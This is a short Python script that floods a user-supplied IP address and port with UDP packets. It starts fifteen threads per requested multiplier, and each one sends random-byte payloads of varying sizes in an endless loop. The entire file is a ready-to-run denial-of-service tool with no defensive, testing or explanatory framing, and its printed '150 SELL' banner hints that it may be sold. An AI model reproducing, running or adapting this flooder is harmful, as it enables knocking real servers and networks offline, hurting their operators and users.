#!/usr/bin/env python3

import random
import socket
import threading
import time
print("150 SELL")
ip = str(input(" IP:"))
port = int(input(" PORT:"))      # The port used by the server
threads = int(input("PING:"))


def run():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(1):
				s.sendto(data,addr)
				print('200')
			time.sleep(.8)
def run2():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run3():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				
def run4():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				
def run5():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				
def run6():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run7():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run8():
	data = random._urandom(1204)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run9():
	data = random._urandom(64)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run10():
	data = random._urandom(16)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				

def run11():
	data = random._urandom(1560)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			for x in range(60):
				s.sendto(data,addr)
				
def run12():
	data = random._urandom(512)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			
			for x in range(60):
				s.sendto(data,addr)

def run13():
	data = random._urandom(512)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			
			for x in range(60):
				s.sendto(data,addr)

def run14():
	data = random._urandom(512)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			
			for x in range(60):
				s.sendto(data,addr)

def run15():
	data = random._urandom(512)
	while True:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			
			
			for x in range(60):
				s.sendto(data,addr)

                
			
for Y in range(threads):
		th1 = threading.Thread(target = run)
		th1.start()
		th2 = threading.Thread(target = run2)
		th2.start()
		th3 = threading.Thread(target = run3)
		th3.start()
		th4 = threading.Thread(target = run4)
		th4.start()
		th5 = threading.Thread(target = run5)
		th5.start()
		th6 = threading.Thread(target = run6)
		th6.start()
		th7 = threading.Thread(target = run7)
		th7.start()
		th8 = threading.Thread(target = run8)
		th8.start()
		th9 = threading.Thread(target = run9)
		th9.start()
		th10 = threading.Thread(target = run10)
		th10.start()
		th11 = threading.Thread(target = run11)
		th11.start()
		th15 = threading.Thread(target = run12)
		th15.start()
		th12 = threading.Thread(target = run13)
		th12.start()
		th13 = threading.Thread(target = run14)
		th13.start()
		th14 = threading.Thread(target = run15)
		th14.start()